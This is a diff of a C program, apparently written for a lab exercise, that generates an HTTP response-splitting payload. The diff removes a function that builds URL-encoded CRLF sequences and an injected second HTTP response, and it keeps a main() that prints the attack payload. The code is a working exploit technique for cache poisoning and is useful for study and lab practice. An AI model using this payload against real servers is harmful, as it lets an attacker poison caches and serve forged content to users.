@@ -26,51 +26,6 @@ void generate_last_modified(char *buffer, size_t buffer_size) {
 }
 
 /**
- * Builds a simplified attack payload with URL-encoded CRLF injection.
- * 
- * Structure:
- * - %0d%0a (CRLF) to break out of original response headers
- * - Content-Length: 0 to terminate first response body
- * - %0d%0a%0d%0a (double CRLF) to end first HTTP response
- * - Injected second HTTP response with malicious content
- * 
- * @return Pointer to static buffer containing the payload
- */
-char* build_attack_payload() {
-    char last_modified[128];
-    generate_last_modified(last_modified, sizeof(last_modified));
-    
-    char body[256];
-    snprintf(body, sizeof(body), "<HTML>%s</HTML>", YOUR_ID);
-    
-    int body_length = strlen(body);
-    
-    char second_response[2048];
-    snprintf(second_response, sizeof(second_response),
-        "HTTP/1.1 200 OK\r\n"
-        "Content-Length: %d\r\n"
-        "Last-Modified: %s\r\n"
-        "Content-Type: text/html\r\n"
-        "\r\n"
-        "%s",
-        body_length,
-        last_modified,
-        body
-    );
-    
-    static char payload[4096];
-    snprintf(payload, sizeof(payload),
-        "%%0d%%0a"
-        "Content-Length: 0"
-        "%%0d%%0a%%0d%%0a"
-        "%s",
-        second_response
-    );
-    
-    return payload;
-}
-
-/**
  * URL-encodes a string according to RFC 3986.
  * 
  * Encodes all characters except unreserved characters (A-Z, a-z, 0-9, -, _, ., ~).
@@ -162,14 +117,6 @@ char* build_full_request() {
     return full_request;
 }
 
-/**
- * Main function that demonstrates the attack payload generation.
- * 
- * Prints:
- * - Generated Last-Modified timestamp
- * - HTML body content and its length
- * - Complete HTTP request with embedded response splitting payload
- */
 int main() {
     printf("=== HTTP Response Splitting Attack Payload ===\n\n");
     
